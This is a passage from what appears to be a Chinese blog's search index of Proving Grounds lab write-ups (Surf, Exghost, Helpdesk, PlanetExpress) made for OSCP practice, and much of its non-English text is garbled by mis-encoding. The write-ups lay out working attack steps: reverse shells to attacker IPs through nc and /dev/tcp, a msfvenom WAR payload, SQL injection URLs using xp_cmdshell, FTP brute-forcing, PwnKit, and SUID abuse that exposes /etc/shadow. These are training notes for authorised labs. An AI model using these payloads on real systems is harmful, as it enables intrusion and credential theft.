è¯•äº†ä¸‹å†™åœ¨æ–‡ä»¶æœ«å°¾ä¸è¡Œï¼Œåªèƒ½å†™åœ¨å‰é¢ã€‚ james@Surf:~$ vi /var/backups/database-backup.php james@Surf:~$ james@Surf:~$ head /var/backups/database-backup.php \u003c?php /** * Updated: Mohammad M. AlBanna * Website: MBanna.info */ system(\"nc 192.168.45.197 9000 -e /bin/sh\"); james@Surf:~$ sudo /usr/bin/php /var/backups/database-backup.php â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/surf] â””â”€$ nc -nlvp 9000 listening on [any] 9000 ... connect to [192.168.45.197] from (UNKNOWN) [192.168.162.171] 33036 id uid=0(root) gid=0(root) groups=0(root) ls /root/ proof.txt cat /root/proof.txt e58a15c56a6f26de90c3393c15f0bc20 ","date":"2024-01-02","objectID":"/posts/provinggrounds-surf/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Surf WriteUp","uri":"/posts/provinggrounds-surf/"},{"categories":["é¶åœº"],"content":"Exghost ç¬¬12å°ï¼ŒLinuxç³»ç»Ÿï¼Œéš¾åº¦Easyï¼Œåç§° Exghost ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.242.183 -T4 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-21 09:43 CST Nmap scan report for 192.168.242.183 Host is up (0.27s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.41 Service Info: Host: 127.0.0.1; OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.32 seconds ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["é¶åœº"],"content":"InitAccess å¯¹Webè¿›è¡Œæ‰«æ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ dirsearch -x 400,403,404 -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.242.183/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475 Output File: /home/xavier/.dirsearch/reports/192.168.242.183/-_23-12-21_09-45-55.txt Error Log: /home/xavier/.dirsearch/logs/errors-23-12-21_09-45-55.log Target: http://192.168.242.183/ [09:45:56] Starting: [09:46:35] 301 - 320B - /uploads -\u003e http://192.168.242.183/uploads/ Task Completed å¯¹ftpè¿›è¡Œçˆ†ç ´ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.226.183 ftp Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-31 14:24:43 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task [DATA] attacking ftp://192.168.226.183:21/ [21][ftp] host: 192.168.226.183 login: user password: system 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-31 14:25:12 â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ ftp user@192.168.226.183 Connected to 192.168.226.183. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 229 Entering Extended Passive Mode (|||29597|) ftp: Can't connect to `192.168.226.183:29597': è¿æ¥è¶…æ—¶ 200 EPRT command successful. Consider using EPSV. 150 Here comes the directory listing. -rwxrwxrwx 1 0 0 126151 Jan 27 2022 backup 226 Directory send OK. ftp\u003e get backup local: backup remote: backup 200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for backup (126151 bytes). 100% |****************************************| 123 KiB 55.84 KiB/s 00:00 ETA 226 Transfer complete. 126151 bytes received in 00:02 (51.95 KiB/s) ftp\u003e exit 221 Goodbye. â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ file backup backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144) æ˜¯ä¸ªæ•°æ®åŒ…ç±»å‹ï¼Œæƒ³å°è¯•ç”¨tcpdumpå»è§£æï¼Œæ²¡æˆåŠŸï¼Œç›´æ¥åŒå‡»backupï¼Œç”¨wiresharkè¿›è¡Œåˆ†æ ä»ä¸­è·å–ä¸€ä¸ªhttpæ•°æ®åŒ…ï¼Œå‘ç°æ–‡ä»¶ä¸Šä¼ æ¥å£exiftest.phpï¼š POST /exiftest.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------169621313238602050593908562572 Content-Length: 14806 Origin: http://127.0.0.1 Connection: keep-alive Referer: http://127.0.0.1/ Upgrade-Insecure-Requests: 1 -----------------------------169621313238602050593908562572 Content-Disposition: form-data; name=\"myFile\"; filename=\"testme.jpg\" Content-Type: image/jpeg ......JFIF.....x.x.....C...................... ..... ... .. ... ............................C....... .. . . .............................................................\"..................................... .....................}........!1A..Qa.\"q.2....#B...R..$3br. .....%\u0026'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz....................................................................................................... .....................w.......!1..AQ.aq.\"2...B.... #3R..br. .$4.%.....\u0026'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz....................................................................................?..h~.x9..:$......... {.........wq....a.....\u0026...~u.E,..f......rk....Ox7.","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["é¶åœº"],"content":"PE ä¸Šä¼ æ–‡ä»¶ï¼Œä¿¡æ¯æ”¶é›†å¹¶å›ä¼  www-data@exghost:/tmp$ wget http://192.168.45.206/linpeas.sh www-data@exghost:/tmp$ ./linpeas.sh \u003e 1.txt . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe ./linpeas.sh: 1189: [[: not found ./linpeas.sh: 1189: rpm: not found ./linpeas.sh: 1189: 0: not found ./linpeas.sh: 1199: [[: not found Sorry, try again. ./linpeas.sh: 2583: grep -R -B1 \"httpd-php\" /etc/apache2 2\u003e/dev/null: not found gpg-connect-agent: no running gpg-agent - starting '/usr/bin/gpg-agent' gpg-connect-agent: failed to create temporary file '/var/www/.gnupg/.#lk0x000055c75a8c3cb0.exghost.13020': No such file or directory gpg-connect-agent: can't connect to the agent: No such file or directory gpg-connect-agent: error sending standard options: No agent running www-data@exghost:/tmp$ cp 1.txt /var/www/html/ cp: cannot create regular file '/var/www/html/1.txt': Permission denied www-data@exghost:/tmp$ python3 -m http.server 8000 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... ^C Keyboard interrupt received, exiting. www-data@exghost:/tmp$ nc 192.168.45.206 443 \u003c 1.txt å‘ç°å­˜åœ¨CVE-2021-4034 Vulnerable to CVE-2021-4034 ä½¿ç”¨Pwnkitè¿›è¡Œææƒ www-data@exghost:/tmp$ ./PwnKit root@exghost:/tmp# ls /root/ proof.txt snap root@exghost:/tmp# cat /root/proof.txt ecbda28237ca915f1edb88a8b8a67826 root@exghost:/tmp# ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["é¶åœº"],"content":"SumUp çˆ†ç ´çš„å­—å…¸é€‰æ‹©å¾ˆå…³é”®ï¼Œä¸ç„¶ä¼šæµªè´¹å¾ˆå¤šæ—¶é—´å’Œç²¾åŠ›ã€‚ æ–‡ä»¶ä¸Šä¼ æ¥å£ä¸ä¸€å®šæ˜¯æ–‡ä»¶ä¸Šä¼  å¤šè§‚å¯Ÿè¿”å›åŒ…ï¼Œè«åå…¶å¦™çš„æåˆ°æŸä¸ªå·¥å…·ï¼Œæ¶‰åŠåˆ°å…·ä½“ç‰ˆæœ¬å·ï¼Œè¦å¤šåšä¿¡æ¯æ”¶é›†å’Œå†å²æ¼æ´æŸ¥è¯¢ ","date":"2023-12-31","objectID":"/posts/provinggrounds-exghost/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Exghost Writeup","uri":"/posts/provinggrounds-exghost/"},{"categories":["é¶åœº"],"content":"Helpdesk ç¬¬11å°ï¼ŒWindowsç³»ç»Ÿï¼Œéš¾åº¦Easyï¼Œåç§° Helpdesk 192.168.244.43 ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.244.43 -T4 -Pn Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-21 00:18 CST Nmap scan report for 192.168.244.43 Host is up (0.25s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ms-wbt-server Microsoft Terminal Service 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["é¶åœº"],"content":"web â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ whatweb -a 3 http://192.168.244.43:8080/ http://192.168.244.43:8080/ [200 OK] Apache, Cookies[JSESSIONID], Country[RESERVED][ZZ], Frame, HTTPServer[Apache-Coyote/1.1], IP[192.168.244.43], Java, PasswordField[j_password], Script[text/JavaScript,text/javascript], Title[ManageEngine ServiceDesk Plus] â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ searchsploit manageEngine ServiceDesk Plus æœç´¢å‘ç°æœ‰æ¼æ´ï¼Œä»Webé¡µé¢å¯ä»¥çœ‹åˆ°æ˜¯7.6ç‰ˆæœ¬ã€‚ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ searchsploit manageEngine ServiceDesk Plus 7.6 ------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------- --------------------------------- ManageEngine ServiceDesk Plus 7.6 - woID SQL Injection | jsp/webapps/11793.txt Zoho ManageEngine ServiceDesk Plus (SDP) \u003c 10.0 build 10012 - Arbi | jsp/webapps/46413.txt Zoho ManageEngine ServiceDesk Plus \u003c 10.5 - Improper Access Restri | multiple/webapps/46894.txt ------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ searchsploit -x 11793 â€¦â€¦ Vulnerability Description: A Vulnerability has been discovered in Manage Engine Service Desk Plus, which can be exploited by malicious people to conduct SQL injection attacks. Input passed via the \"woID\" parameter to WorkOrder.do is not properly sanitized before being used in a SQL query. This can be exploited to manipulate SQL queries by injecting arbitrary SQL code. The vulnerability is confirmed in version 7.6. Other versions may also be affected. Proof of Concept: Microsoft Windows Environment with MySQL: http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=WorkOrder.WORKORDERID=6) union select 1,2,3,4,5,6,7,8,load_file(\"c:\\\\boot.ini\"),10,11,12,13,14,15,16,17,18,19,1 into dumpfile 'C:\\\\ManageEngine\\\\ServiceDesk\\\\applications\\\\extracted\\\\AdventNetServiceDesk.eear\\\\AdventNetServiceDeskWC.ear\\\\AdventNetServiceDesk.war\\\\images\\\\boot.ini'/* then browse, http://x.x.x.x:8080/images/boot.ini Microsoft Windows Environment with MSSQL: http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=1); EXEC xp_cmdshell 'net user moebius m03biu5inj3ct$ /add';-- http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=1); EXEC xp_cmdshell 'net localgroup administrators moebius /add';-- GNU/Linux with MySQL: http://x.x.x.x:8080/WorkOrder.do?woMode=viewWO\u0026woID=1%29%20union%20select%201,2,3,4,5, 6,7,8,load_file%28%27/etc/passwd%27%29,10,11,12,13,14,15,16,17,18,19,20%20into%20dumpfile% 20%27/home/moebius/ManageEngine/ServiceDesk/applications/extracted/AdventNetServiceDesk.eear /AdventNetServiceDeskWC.ear/AdventNetServiceDesk.war/images/passwd.txt%27/* then browse, http://x.x.x.x:8080/images/passwd.txt ç›´æ¥è®¿é—®æ²¡æœ‰ååº”ï¼Œå¯èƒ½éœ€è¦ç™»å½•ã€‚ Googleæœç´¢é»˜è®¤å¯†ç ï¼Œå‘ç°æ˜¯administrator\\administratorï¼Œä½¿ç”¨è¿™ä¸ªå¯†ç æˆåŠŸç™»å½•åå° ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["é¶åœº"],"content":"Init Access æˆ‘å…ˆæ‹¿çš„mssqlçš„POCè¿›è¡Œæµ‹è¯•ï¼Œçˆ†å‡ºäº†SQLé”™è¯¯ï¼Œæç¤ºæ˜¯MySQLæ•°æ®åº“ï¼š javax.servlet.ServletException: java.sql.SQLException: Syntax error or access violation, message from server: \u0026quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '; EXEC xp_cmdshell 'net user moebius m03biu5inj3ct$ /add';--)' at line 1\u0026quot; GET /WorkOrder.do?woMode=viewWO\u0026woID=WorkOrder.WORKORDERID%3d6)union+select+1,2,3,4,5,6,7,8,load_file(\"c%3a\\\\boot.ini\"),10,11,12,13,14,15,16,17,18,19,1+into+dumpfile+'C%3a\\\\ManageEngine\\\\ServiceDesk\\\\applications\\\\extracted\\\\AdventNetServiceDesk.eear\\\\AdventNetServiceDeskWC.ear\\\\AdventNetServiceDesk.war\\\\images\\\\boot.ini'/* HTTP/1.1 Host: 192.168.244.43:8080 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID=2D805EDCF4BA886BE98027DA4AA04DE6; JSESSIONIDSSO=B426F21E2CB902688F345DBF470D7683 ç›´æ¥æ‰§è¡ŒPOCï¼Œè¿”å›æŠ¥é”™æ‰¾ä¸åˆ°æ–‡ä»¶ å°è¯•å†™webshellå¤±è´¥ï¼Œjspæ— æ³•æ‰§è¡Œ å°è¯•å…¶ä»–æ¼æ´ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.232 LPORT=80 -f war -o shell.war Payload size: 13323 bytes Final size of war file: 13323 bytes Saved as: shell.war â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ python3 cve-2014-5301.py 192.168.244.43 8080 administrator administrator shell.war Trying http://192.168.244.43:8080/5KF7BB1owtfPSmLhIyI7IvsioF80YhEQ/jjehycsuozbubil/D9zMMp8eubDUm04P åˆ©ç”¨è„šæœ¬ï¼šCVE-2014-5301 ManageEngine ServiceDesk Plus 7.6.0 Arbitrary File Upload â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ nc -nlvp 80 listening on [any] 80 ... connect to [192.168.45.232] from (UNKNOWN) [192.168.244.43] 49196 Microsoft Windows [Version 6.0.6001] Copyright (c) 2006 Microsoft Corporation. All rights reserved. C:\\ManageEngine\\ServiceDesk\\bin\u003ewhoami whoami nt authority\\system C:\\Users\u003etype administrator\\desktop\\proof.txt type administrator\\desktop\\proof.txt 362343a6e1593e22b5f3a58cdef9f423 ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["é¶åœº"],"content":"PE æ— éœ€ææƒ ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["é¶åœº"],"content":"Sum up ç™»å½•å£ï¼Œæ‰¾ä¸‹é»˜è®¤å¯†ç  ä¸è¦å¤ªä¾èµ–searchsploitï¼Œé‡Œé¢æ¼æ´ä¸å…¨ å¤šåˆ©ç”¨æœç´¢å¼•æ“ï¼ŒGoogleçš„æœç´¢æ•ˆæœæœ€å¥½ å¤šåˆ©ç”¨githubæœç´¢æ¼æ´EXP ","date":"2023-12-20","objectID":"/posts/provinggrounds-helpdesk/:6:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds HelpDesk Writeup","uri":"/posts/provinggrounds-helpdesk/"},{"categories":["é¶åœº"],"content":"PlanetExpress ç¬¬10å°ï¼ŒLinuxç³»ç»Ÿï¼Œéš¾åº¦Easyï¼Œåç§° PlanetExpress 192.168.176.205 ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.176.205 -T4 [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-19 14:32 CST Nmap scan report for 192.168.176.205 Host is up (0.40s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http Apache httpd 2.4.38 ((Debian)) 9000/tcp open cslistener? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.54 seconds ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["é¶åœº"],"content":"WebScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ dirsearch -x 400,403,404 -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.176.205 _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475 Output File: /home/xavier/.dirsearch/reports/192.168.176.205/_23-12-19_14-40-23.txt Error Log: /home/xavier/.dirsearch/logs/errors-23-12-19_14-40-23.log Target: http://192.168.176.205/ [14:40:24] Starting: [14:40:29] 200 - 111B - /.gitignore [14:40:37] 301 - 319B - /assets -\u003e http://192.168.176.205/assets/ [14:40:38] 301 - 319B - /config -\u003e http://192.168.176.205/config/ [14:40:39] 301 - 320B - /content -\u003e http://192.168.176.205/content/ [14:40:41] 200 - 5KB - /index.php/login/ [14:40:41] 200 - 5KB - /index.php [14:40:46] 301 - 320B - /plugins -\u003e http://192.168.176.205/plugins/ [14:40:50] 200 - 0B - /vendor/composer/autoload_psr4.php [14:40:50] 200 - 23KB - /vendor/composer/installed.json [14:40:50] 200 - 0B - /vendor/composer/autoload_real.php [14:40:50] 200 - 0B - /vendor/composer/autoload_files.php [14:40:50] 200 - 0B - /vendor/autoload.php [14:40:50] 200 - 0B - /vendor/composer/autoload_namespaces.php [14:40:50] 200 - 0B - /vendor/composer/autoload_static.php [14:40:50] 200 - 1KB - /vendor/composer/LICENSE [14:40:51] 301 - 319B - /themes -\u003e http://192.168.176.205/themes/ [14:40:53] 200 - 0B - /vendor/composer/ClassLoader.php [14:40:53] 200 - 0B - /vendor/composer/autoload_classmap.php Task Completed æ‰«æäºŒçº§ç›®å½•ï¼ˆæ€»å¿˜â€¦â€¦ï¼‰ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ dirsearch -x 400,403,404 -t 500 -e php,asp,aspx,ini,txt,bak -u http://192.168.176.205/config/ _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, ini, txt, bak | HTTP method: GET | Threads: 500 | Wordlist size: 11475 Output File: /home/xavier/.dirsearch/reports/192.168.176.205/-config-_23-12-19_15-20-33.txt Error Log: /home/xavier/.dirsearch/logs/errors-23-12-19_15-20-33.log Target: http://192.168.176.205/config/ [15:20:34] Starting: [15:20:39] 200 - 33B - /config/.gitignore [15:20:48] 200 - 812B - /config/config.yml Task Completed â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ curl \"http://192.168.176.205/config/config.yml\" â€¦â€¦ ## # Self developed plugin for PlanetExpress # #PicoTest: # enabled: true â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ curl \"http://192.168.176.205/config/.gitignore\" # This file is meant to be empty æ³¨æ„åˆ°config.ymlä¸­æœ€æœ«å°¾çš„æ³¨é‡Šï¼Œå¯ç”¨äº†è‡ªå·±å¼€å‘çš„æ’ä»¶PicoTestã€‚ è®¿é—®å‘ç°æ˜¯phpinfo ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["é¶åœº"],"content":"Init Access å…³äº9000ç«¯å£ï¼Œåœ¨å¦‚ä¸‹æ–‡ç« æ‰¾åˆ°äº†å†å²æ¼æ´å’Œå·¥å…·ï¼š https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 å°è¯•è¯»å–æ–‡ä»¶æˆåŠŸï¼š å°è¯•å‘½ä»¤æ‰§è¡Œï¼Œå›å¤´çœ‹ä¸‹phpinfoä¸­çš„disable_functionsï¼Œä»¥ä¸‹å‡½æ•°è¢«ç¦ç”¨ã€‚ disable_functions system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals, æœ€åæ‰¾æ¥è¿™ä¸ªå‡½æ•°: passthru â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ python3 fpm.py 192.168.244.205 \"/var/www/html/planetexpress/index.php\" -c '\u003c?php passthru(\"id\"); ?\u003e' | head Content-type: text/html; charset=UTF-8 uid=33(www-data) gid=33(www-data) groups=33(www-data) \u003c!DOCTYPE html\u003e \u003c!--[if lt IE 7]\u003e \u003chtml class=\"no-js lt-ie9 lt-ie8 lt-ie7\"\u003e \u003c![endif]--\u003e \u003c!--[if IE 7]\u003e \u003chtml class=\"no-js lt-ie9 lt-ie8\"\u003e \u003c![endif]--\u003e \u003c!--[if IE 8]\u003e \u003chtml class=\"no-js lt-ie9\"\u003e \u003c![endif]--\u003e \u003c!--[if gt IE 8]\u003e\u003c!--\u003e \u003chtml class=\"no-js\"\u003e \u003c!--\u003c![endif]--\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e åå‘è¿æ¥ï¼Œè¿™é‡Œå¤–è¿æœ€å¥½ç”¨80ï¼Œå› ä¸ºå…¶ä»–ç«¯å£å¯èƒ½æœ‰é™åˆ¶å¤–è”ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ python3 fpm.py 192.168.244.205 \"/var/www/html/planetexpress/index.php\" -c '\u003c?php passthru(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/192.168.45.203/80 0\u003e\u00261\\\"\"); ?\u003e' | head ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["é¶åœº"],"content":"PE www-data@planetexpress:~$ find / -perm -u=s -type f -exec ls -l {} \\; 2\u003e/dev/null \u003c / -perm -u=s -type f -exec ls -l {} \\; 2\u003e/dev/null -rwsr-xr-- 1 root messagebus 51184 Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 436552 Jan 31 2020 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rws---r-x 1 root root 3644754 Jan 10 2022 /usr/sbin/relayd -rwsr-xr-x 1 root root 51280 Jan 10 2019 /usr/bin/mount -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd -rwsr-xr-x 1 root root 63568 Jan 10 2019 /usr/bin/su -rwsr-xr-x 1 root root 34896 Apr 22 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 34888 Jan 10 2019 /usr/bin/umount -rwsr-xr-x 1 root root 54096 Jul 27 2018 /usr/bin/chfn -rwsr-xr-x 1 root root 44528 Jul 27 2018 /usr/bin/chsh -rwsr-xr-x 1 root root 44440 Jul 27 2018 /usr/bin/newgrp -rwsr-xr-x 1 root root 157192 Jan 20 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 84016 Jul 27 2018 /usr/bin/gpasswd æ³¨æ„åˆ°è¿™ä¸ªrelaydå‘½ä»¤ï¼ŒæŸ¥çœ‹å¸®åŠ© www-data@planetexpress:~$ /usr/sbin/relayd -h /usr/sbin/relayd -h Usage: relayd [options] [actions] Actions: default action start daemon -h show this help message -v show version info -k kill running daemon -s get running status -U hup (reload configs) -a [service] add service for relay -r [service] remove service for relay -i get real client ip -b [up|down] broadcast the DS boot state -R reopen the log file Options: -C [file] read config from file -d enable debug mode. will not run in background -P [file] set pid file for daemon -g [ip] remote source ip -n [port] remote source port æœ‰ä¸ª-Cè¯»å–æ–‡ä»¶çš„é€‰é¡¹ï¼Œå› ä¸ºæ˜¯suidæƒé™ï¼Œå¯ä»¥è¯»å–ä»»ä½•æ–‡ä»¶ï¼Œè€Œä¸”è¯¥å‘½ä»¤æ“ä½œåï¼Œå¯å¯¼è‡´åŸè¯¥æƒé™æ–‡ä»¶è¢«ä»»ä½•äººå¯è¯»ã€‚ æ‹¿åˆ°å¯†ç hash www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /etc/shadow -rw-r----- 1 root shadow 940 Jan 10 2022 /etc/shadow www-data@planetexpress:~$ /usr/sbin/relayd -C /etc/shadow /usr/sbin/relayd -C /etc/shadow [ERR] 2023-12-19 12:50:51 config.cpp:1539 write [ERR] 2023-12-19 12:50:51 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217] [ERR] 2023-12-19 12:50:51 config.cpp:1189 bad json format [/etc/shadow] [ERR] 2023-12-19 12:50:51 invalid config file www-data@planetexpress:~$ ls -l /etc/shadow ls -l /etc/shadow -rw-r--r-- 1 root shadow 940 Jan 10 2022 /etc/shadow www-data@planetexpress:~$ head /etc/shadow head /etc/shadow 